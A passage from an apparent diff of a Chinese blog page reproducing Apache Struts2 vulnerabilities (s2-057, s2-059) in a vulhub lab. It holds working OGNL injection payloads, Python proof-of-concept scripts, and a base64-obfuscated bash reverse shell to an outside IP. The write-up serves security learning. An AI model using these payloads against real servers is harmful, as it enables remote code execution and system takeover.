class="number">40</span>com.opensymphony.xwork2.ognl.OgnlUtil%<span class="number">40</span>class%<span class="number">29</span>%<span class="number">29.</span>%<span class="number">28</span>%<span class="number">23</span>context.setMemberAccess%<span class="number">28</span>%<span class="number">23</span>dm%<span class="number">29</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">29.</span>%<span class="number">28</span>%<span class="number">23</span>cmds%<span class="number">3</span>D%<span class="number">28</span>%<span class="number">7</span>B%<span class="number">27</span>%<span class="number">2</span>Fbin%<span class="number">2</span>Fbash%<span class="number">27</span>%<span class="number">2</span>C%<span class="number">27</span>-c%<span class="number">27</span>%<span class="number">2</span>C%<span class="number">27</span>id%<span class="number">27</span>%<span class="number">7</span>D%<span class="number">29</span>%<span class="number">29.</span>%<span class="number">28</span>%<span class="number">23</span>p%<span class="number">3</span>Dnew+java.lang.ProcessBuilder%<span class="number">28</span>%<span class="number">23</span>cmds%<span class="number">29</span>%<span class="number">29.</span>%<span class="number">28</span>%<span class="number">23</span>process%<span class="number">3</span>D%<span class="number">23</span>p.start%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29.</span>%<span class="number">28</span>%<span class="number">40</span>org.apache.commons.io.IOUtils%<span class="number">40</span>toString%<span class="number">28</span>%<span class="number">23</span>process.getInputStream%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">7</span>D%<span class="number">0</span>A</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/07/vulhub-struts2/1602066447445.png" alt="1602066447445"></p>
+<p><img src="/2020/10/07/vulhub-struts2/1602066479820.png" alt="1602066479820"></p>
+<h1 id="s2-057"><a href="#s2-057" class="headerlink" title="s2-057"></a>s2-057</h1><p>原理：</p>
+<ul>
+<li>-alwaysSelectFullNamespace为true。</li>
+<li>-action元素没有设置namespace属性，或者使用了通配符。</li>
+<li>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</li>
+</ul>
+<p>影响版本：</p>
+<ul>
+<li>Struts 2.3–2.3.34</li>
+<li>Struts2.5–2.5.16</li>
+</ul>
+<p>访问<a href="http://192.168.102.128:8080/index" target="_blank" rel="noopener">http://192.168.102.128:8080/index</a></p>
+<p>.poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">24</span>%<span class="number">7</span>B%<span class="number">28</span>%<span class="number">23</span>dm%<span class="number">3</span>D%<span class="number">40</span>ognl.OgnlContext%<span class="number">40</span>DEFAULT_MEMBER_ACCESS%<span class="number">29.</span>%<span class="number">28</span>%<span class="number">23</span>ct%<span class="number">3</span>D%<span class="number">23</span>request%<span class="number">5</span>B%<span class="number">27</span>struts.valueStack%<span class="number">27</span>%<span class="number">5</span>D.context%<span class="number">29.</span>%<span class="number">28</span>%<span class="number">23</span>cr%<span class="number">3</span>D%<span class="number">23</span>ct%<span class="number">5</span>B%<span class="number">27</span>com.opensymphony.xwork2.ActionContext.container%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">29.</span>%<span class="number">28</span>%<span class="number">23</span>ou%<span class="number">3</span>D%<span class="number">23</span>cr.getInstance%<span class="number">28</span>%<span class="number">40</span>com.opensymphony.xwork2.ognl.OgnlUtil%<span class="number">40</span>class%<span class="number">29</span>%<span class="number">29.</span>%<span class="number">28</span>%<span class="number">23</span>ou.getExcludedPackageNames%<span class="number">28</span>%<span class="number">29.</span>clear%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29.</span>%<span class="number">28</span>%<span class="number">23</span>ou.getExcludedClasses%<span class="number">28</span>%<span class="number">29.</span>clear%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29.</span>%<span class="number">28</span>%<span class="number">23</span>ct.setMemberAccess%<span class="number">28</span>%<span class="number">23</span>dm%<span class="number">29</span>%<span class="number">29.</span>%<span class="number">28</span>%<span class="number">23</span>a%<span class="number">3</span>D%<span class="number">40</span>java.lang.Runtime%<span class="number">40</span>getRuntime%<span class="number">28</span>%<span class="number">29.</span>exec%<span class="number">28</span>%<span class="number">27</span>id%<span class="number">27</span>%<span class="number">29</span>%<span class="number">29.</span>%<span class="number">28</span>%<span class="number">40</span>org.apache.commons.io.IOUtils%<span class="number">40</span>toString%<span class="number">28</span>%<span class="number">23</span>a.getInputStream%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">7</span>D/actionChain1.action</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/07/vulhub-struts2/1602070235888.png" alt="1602070235888"></p>
+<h1 id="s2-059"><a href="#s2-059" class="headerlink" title="s2-059"></a>s2-059</h1><p>poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = <span class="string">"http://127.0.0.1:8080"</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">"id"</span>: <span class="string">"%&#123;(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))&#125;"</span></span><br><span class="line">&#125;</span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">"id"</span>: <span class="string">"%&#123;(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('touch /tmp/success'))&#125;"</span></span><br><span class="line">&#125;</span><br><span class="line">res1 = requests.post(url, data=data1)</span><br><span class="line"><span class="comment"># print(res1.text)</span></span><br><span class="line">res2 = requests.post(url, data=data2)</span><br><span class="line"><span class="comment"># print(res2.text)</span></span><br></pre></td></tr></table></figure>
+
+<p>进入容器发现创建成功</p>
+<p><img src="/2020/10/07/vulhub-struts2/1602128952620.png" alt="1602128952620"></p>
+<p>反弹shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = <span class="string">"http://127.0.0.1:8080"</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">"id"</span>: <span class="string">"%&#123;(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))&#125;"</span></span><br><span class="line">&#125;</span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">"id"</span>: <span class="string">"%&#123;(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMTA0LjE3Mi83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'))&#125;"</span></span><br><span class="line">&#125;</span><br><span class="line">res1 = requests.post(url, data=data1)</span><br><span class="line"><span class="keyword">print</span>(res1.text)</span><br><span class="line">res2 = requests.post(url, data=data2)</span><br><span class="line"><span class="keyword">print</span>(res2.text)</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <span>文章作者:</span><a href="/" title="访问 CyzCc 的个人博客">CyzCc</a><br>
+  <span>最后更新:</span>2020年12月07日 15:12:34<br>
+  <span>原始链接:</span><a href="/2020/10/07/vulhub-struts2/" title="vulhub漏洞复现-struts2">https://cyzcc.vip/2020/10/07/vulhub-struts2/</a><br>
+  <span>版权声明:</span>转载请注明出处！<br>  
+</div>
+
+      
+</div>
+	
+	
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持就是我的动力！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="CyzCc Thanks"/>
+        <p>Thanks</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        
+          <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------　　　　本文结束　<i class="fa fa-heart"></i>　感谢您的阅读　　　　-------------</div>
+    
+</div>
+
+        
+      </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"><i class="fa fa-tag"></i> 漏洞复现</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/09/29/sunset-midnight/" rel="next" title="vulnhub靶机-sunset-midnight">
+                <i class="fa fa-chevron-left"></i> vulnhub靶机-sunset-midnight
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.gif"
+                alt="CyzCc" />
+            
+              <p class="site-author-name" itemprop="name">CyzCc</p>
+              <p class="site-description motion-element" itemprop="description">卍~~黑玫瑰将再次绽放~~卐</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">67</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="1643277253@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://www.heibanke.com/lesson/crawler_ex00/" target="_blank" title="爬虫闯关">
+                      
+                        <i class="fa fa-fw fa-globe"></i>爬虫闯关</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://adworld.xctf.org.cn/" target="_blank" title="攻防世界">
+                      
+                        <i class="fa fa-fw fa-globe"></i>攻防世界</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://buuoj.cn/" target="_blank" title="BUUCTF">
+                      
+                        <i class="fa fa-fw fa-globe"></i>BUUCTF</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://ctf.bugku.com/" target="_blank" title="BUGKU">
+                      
+                        <i class="fa fa-fw fa-globe"></i>BUGKU</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://xss-quiz.int21h.jp/" target="_blank" title="XSS-challenges">
+                      
+                        <i class="fa fa-fw fa-globe"></i>XSS-challenges</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://ctf.hutc.xyz/" target="_blank" title="HUCTF">
+                      
+                        <i class="fa fa-fw fa-globe"></i>HUCTF</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://paper.seebug.org/" target="_blank" title="Paper">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Paper</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://hkyx.myhack58.com/" target="_blank" title="黑客闯关游戏">
+                      
+                        <i class="fa fa-fw fa-globe"></i>黑客闯关游戏</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.freebuf.com/" target="_blank" title="FreeBuf">
+                      
+                        <i class="fa fa-fw fa-globe"></i>FreeBuf</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-globe"></i>CSDN</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://wiki.0-sec.org/#/dashboard" target="_blank" title="Zero Security">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Zero Security</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          <div id="days"></div>
+<script>
+function show_date_time(){
+window.setTimeout("show_date_time()", 1000);
+BirthDay=new Date("10/30/2019 15:13:14");
+today=new Date();
+timeold=(today.getTime()-BirthDay.getTime());
+sectimeold=timeold/1000
+secondsold=Math.floor(sectimeold);
+msPerDay=24*60*60*1000
+e_daysold=timeold/msPerDay
+daysold=Math.floor(e_daysold);
+e_hrsold=(e_daysold-daysold)*24;
+hrsold=setzero(Math.floor(e_hrsold));
+e_minsold=(e_hrsold-hrsold)*60;
+minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+seconds=setzero(Math.floor((e_minsold-minsold)*60));
+document.getElementById('days').innerHTML="已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分 "+seconds+" 秒";
+}
+function setzero(i){
+if (i<10)
+{i="0" + i};
+return i;
+}
+show_date_time();
+</script>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#s2-001"><span class="nav-number">1.</span> <span class="nav-text">s2-001</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#s2-005"><span class="nav-number">2.</span> <span class="nav-text">s2-005</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#s2-007"><span class="nav-number">3.</span> <span class="nav-text">s2-007</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#s2-008"><span class="nav-number">4.</span> <span class="nav-text">s2-008</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#s2-009"><span class="nav-number">5.</span> <span class="nav-text">s2-009</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#s2-012"><span class="nav-number">6.</span> <span class="nav-text">s2-012</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#s2-013"><span class="nav-number">7.</span> <span class="nav-text">s2-013</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#s2-015"><span class="nav-number">8.</span> <span class="nav-text">s2-015</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#s2-016"><span class="nav-number">9.</span> <span class="nav-text">s2-016</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#s2-032"><span class="nav-number">10.</span> <span class="nav-text">s2-032</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#s2-045"><span class="nav-number">11.</span> <span class="nav-text">s2-045</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#s2-046"><span class="nav-number">12.</span> <span class="nav-text">s2-046</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#s2-048"><span class="nav-number">13.</span> <span class="nav-text">s2-048</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#s2-052"><span class="nav-number">14.</span> <span class="nav-text">s2-052</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#s2-053"><span class="nav-number">15.</span> <span class="nav-text">s2-053</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#s2-057"><span class="nav-number">16.</span> <span class="nav-text">s2-057</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#s2-059"><span class="nav-number">17.</span> <span class="nav-text">s2-059</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cyzCc</span>
+
+ <!-- 
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">173.2k</span>
+  
+
+</div>
+
+-->
+
+
+
+
+
+
+<!-- 新增访客统计代码 -->
+<!--<div class="busuanzi-count">
+    <script async="" src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      访问用户： <span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 人
+    </span>
+    <div class="powered-by"></div>
+    <span class="site-uv">
+      <i class="fa fa-eye"></i>
+      访问次数： <span class="busuanzi-value" id="busuanzi_value_site_pv"></span> 次
+    </span>
+    <!-- 博客字数统计 -->
+    <span class="site-pv">
+      <i class="fa fa-pencil"></i>
+      博客全站共： <span class="post-count">173.2k</span> 字
+    </span>
+	  <a href="http://www.beian.miit.gov.cn" target="_blank" rel="noopener">蜀ICP备20017267号</a>
+</div>
+<!-- 新增访客统计代码 END-->
+
+        
+<div class="busuanzi-count">
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
